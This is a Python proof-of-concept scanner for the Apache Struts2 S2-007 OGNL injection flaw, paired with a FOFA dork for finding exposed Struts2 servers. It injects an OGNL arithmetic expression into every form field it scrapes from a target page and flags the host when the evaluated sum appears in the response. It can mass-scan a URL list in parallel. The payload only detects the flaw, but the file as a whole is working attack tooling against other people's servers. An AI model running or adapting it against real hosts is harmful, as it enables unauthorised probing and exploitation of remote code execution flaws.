#FOFA: app="struts2"

import requests
import re
import argparse
import urllib3
import urllib
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
import random
import string
import json
import time

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    result = {
        'name': 'S2-007 Remote Code Execution Vulnerablity',
        'vulnerable': False
    }
    try:
        s = requests.Session()
        response = s.get(target, timeout=3)
        forms = re.findall(r'<form.*</form>', response.text, re.DOTALL)
        for form in forms:
            action = re.findall(r'action="([^"]*)"', form)[0]
            vulurl = urllib.parse.urljoin(target, action)
            inputs = re.findall(r'<input.*>', form)
            first = True
            payload = ''
            for input in inputs:
                try:
                    p = re.findall(r'name=[\'\"]([^\'\"]+)[\'\"]', input)[0]
                    if first:
                        payload += p + '={0}'
                        first = False
                    else:
                        payload += '&' + p + '={0}'
                except:
                    continue
            payload = payload.format(r"'%2b(95221%2b924%2b524)%2b'")
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        req = s.post(vulurl, data=payload, headers=headers, timeout=3)
        if re.search(r'95221924524', req.text):
            result['vulnerable'] = True
            result['method'] = 'POST'
            result['url'] = vulurl
            result['position'] = 'data'
            result['payload'] = payload
        print(result)
    except:
        print(f"{target}访问失败")


def main():
    parser = argparse.ArgumentParser("struct2 s2_007 OGNL表达式注入漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()